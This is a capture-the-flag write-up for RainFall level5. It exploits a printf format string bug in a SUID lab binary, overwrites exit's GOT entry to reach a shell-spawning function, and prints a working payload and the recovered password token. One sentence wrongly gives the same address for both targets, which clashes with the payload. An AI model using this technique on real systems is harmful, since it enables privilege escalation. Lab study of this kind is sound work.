@@ -1,0 +1,96 @@
+When switching to user *level5* we're greeted with:
+
+```shell
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
+```
+
+There is another SUID binary:
+
+```shell
+level5@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
+```
+
+When running it, it takes input and prints it afterwards:
+
+```shell
+level5@RainFall:~$ ./level5
+42
+42
+```
+
+Let's copy it over and decompile:
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ scp -P 4242 level5@192.168.64.3:/home/user/level5/level5 .
+          _____       _       ______    _ _ 
+         |  __ \     (_)     |  ____|  | | |
+         | |__) |__ _ _ _ __ | |__ __ _| | |
+         |  _  /  _` | | '_ \|  __/ _` | | |
+         | | \ \ (_| | | | | | | | (_| | | |
+         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|
+
+                 Good luck & Have fun
+
+  To start, ssh with level0/level0 on 192.168.64.3:4242
+level5@192.168.64.3's password: 
+level5                                                                                                                    100% 5385   869.0KB/s   00:00    
+ 
+```
+
+This is the decompile code:
+
+```C
+void o(void)
+{
+  system("/bin/sh");
+                    /* WARNING: Subroutine does not return */
+  _exit(1);
+}
+
+void n(void)
+{
+  char local_20c [520];
+  
+  fgets(local_20c,0x200,stdin);
+  printf(local_20c);
+                    /* WARNING: Subroutine does not return */
+  exit(1);
+}
+
+void main(void)
+{
+  n();
+  return;
+}
+```
+
+Similar to last level, we have format string vulnerability here and we can find out that our buffer is at the 4th address on the stack.
+
+```shell
+level5@RainFall:~$ ./level5
+AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
+AAAA0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e
+```
+
+In the source code, we can see that function `n` is being called and exit right after, so we need to somehow call the function `o`, which is not used anywhere.
+
+![image](https://github.com/hennneh/rainfall/assets/50553280/c929764d-81fa-4065-b8fc-4788dc2bf360)
+
+We know that `exit` function is a libc function. This means that the code for `exit` is not in the binary and it has to link with libc somehow. This linking process starts in the `.got.plt` segment of the binary. We can replace the address that `exit` supposed to link to with function `o` address.
+
+The function `o` address is at `0x080484a4` and `exit` on `.got.plt` at `0x080484a4`. With these we can build our payload
+
+```python
+python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"'
+```
+
+Let's run it
+```
+level5@RainFall:~$ cat /tmp/payload - | ./level5
+[...]
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
